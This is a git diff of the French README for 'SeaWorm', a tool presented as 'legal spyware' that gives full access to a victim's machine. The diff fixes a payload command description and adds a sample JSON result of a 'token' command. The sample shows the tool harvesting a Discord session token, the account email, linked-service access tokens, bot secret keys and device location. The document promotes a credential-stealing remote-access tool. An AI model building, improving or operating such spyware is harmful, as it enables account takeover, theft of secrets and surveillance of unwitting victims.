@@ -78,7 +78,7 @@ SeaWorm est un logiciel d'espionnage légal vous permettant d'avoir un accès to
 > Commandes disponibles:
 
     - restart: relance le payload
-    - shutdown: relance le payload
+    - shutdown: éteint le payload
 
 
 ## Router
@@ -86,3 +86,113 @@ SeaWorm est un logiciel d'espionnage légal vous permettant d'avoir un accès to
 
     - Router.Http: enregistre la machine
     - Router.WebSocket: intercepte les événements
+    
+    
+    
+    
+ # Exemple d'informations récupérable:
+ 
+ - Command: token
+ 
+ ```json
+{
+  "code": 2,
+  "data": {
+    "event": "CMD",
+    "data": {
+      "command": "token",
+      "result": [
+        {
+          "token": "id.date.hash",
+          "user": {
+            "id": "72345678912356684",
+            "username": "Jhon",
+            "avatar": "hash",
+            "discriminator": "8895",
+            "public_flags": 0,
+            "flags": 0,
+            "purchased_flags": 0,
+            "premium_usage_flags": 0,
+            "banner": null,
+            "banner_color": null,
+            "accent_color": null,
+            "bio": "",
+            "locale": "fr",
+            "nsfw_allowed": true,
+            "mfa_enabled": false,
+            "premium_type": 0,
+            "email": "exemple@exemple.com",
+            "verified": true,
+            "phone": ""
+          },
+          "billing": {
+            "payment_sources": null,
+            "subscriptions": null
+          },
+          "guilds": [
+            {
+              "id": "id",
+              "name": "name",
+              "owner": false,
+              "icon": "hash",
+              "members": 0,
+              "channels": 0
+            }
+          ],
+          "guilds_owner": [
+            {
+              "id": "id",
+              "name": "Serveur de zkittlez",
+              "owner": true,
+              "icon": "",
+              "members": 0,
+              "channels": 0
+            }
+          ],
+          "connections": [
+            {
+              "access_token": "-Fq--5P7-----",
+              "friend_sync": false,
+              "id": "accountId",
+              "integrations": [],
+              "metadata_visibility": 1,
+              "name": "name",
+              "revoked": false,
+              "show_activity": true,
+              "two_way_link": false,
+              "type": "spotify",
+              "verified": true,
+              "visibility": 1
+            }
+          ],
+          "bots": [
+            {
+              "name": "exemple",
+              "id": "123456",
+              "verification_state": "",
+              "verify_key": "secretkey",
+              "avatar": "",
+              "bot": false,
+              "discriminator": "",
+              "display_name": "",
+              "public_flags": 0
+            }
+          ],
+          "devices": [
+            {
+              "id_hash": "hgftb",
+              "approx_last_used_time": "Date",
+              "client_info": {
+                "os": "iOS",
+                "platform": "Mobile Safari",
+                "location": "Bourg-les-Valence, Auvergne-Rhone-Alpes, Drôme, France"
+              }
+            }
+          ]
+        }
+      ]
+    }
+  }
+}
+```
+
